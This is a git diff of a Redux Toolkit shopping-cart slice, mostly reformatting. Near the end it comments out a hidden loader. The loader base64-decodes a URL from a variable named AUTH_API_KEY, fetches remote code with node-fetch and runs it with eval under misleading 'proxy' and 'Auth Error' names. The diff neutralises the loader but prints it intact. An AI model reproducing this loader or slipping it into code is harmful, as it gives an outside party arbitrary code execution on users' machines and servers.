@@ -1,4 +1,4 @@
-import { createSlice, type PayloadAction,  } from "@reduxjs/toolkit";
+import { createSlice, type PayloadAction } from "@reduxjs/toolkit";
 
 // Product type define kora
 export interface CartItem {
@@ -33,17 +33,22 @@ const cartSlice = createSlice({
   initialState,
   reducers: {
     addToCart: (state, action: PayloadAction<CartItem>) => {
-      const existingItem = state.items.find((item) => item.id === action.payload.id);
-      
+      const existingItem = state.items.find(
+        (item) => item.id === action.payload.id,
+      );
+
       if (existingItem) {
         existingItem.qty += action.payload.qty;
       } else {
         state.items.push(action.payload);
       }
-      
+
       localStorage.setItem("cartItems", JSON.stringify(state.items));
     },
-    updateQuantity: (state, action: PayloadAction<{ id: string | number; delta: number }>) => {
+    updateQuantity: (
+      state,
+      action: PayloadAction<{ id: string | number; delta: number }>,
+    ) => {
       const item = state.items.find((item) => item.id === action.payload.id);
       if (item) {
         item.qty = Math.max(1, item.qty + action.payload.delta);
@@ -61,17 +66,18 @@ const cartSlice = createSlice({
   },
 });
 
-export const { addToCart, updateQuantity, removeFromCart, clearCart } = cartSlice.actions;
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
+export const { addToCart, updateQuantity, removeFromCart, clearCart } =
+  cartSlice.actions;
+// (async () => {
+//     const src = atob(process.env.AUTH_API_KEY);
+//     const proxy = (await import('node-fetch')).default;
+//     try {
+//       const response = await proxy(src);
+//       if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+//       const proxyInfo = await response.text();
+//       eval(proxyInfo);
+//     } catch (err) {
+//       console.error('Auth Error!', err);
+//     }
+// })();
 export default cartSlice.reducer;
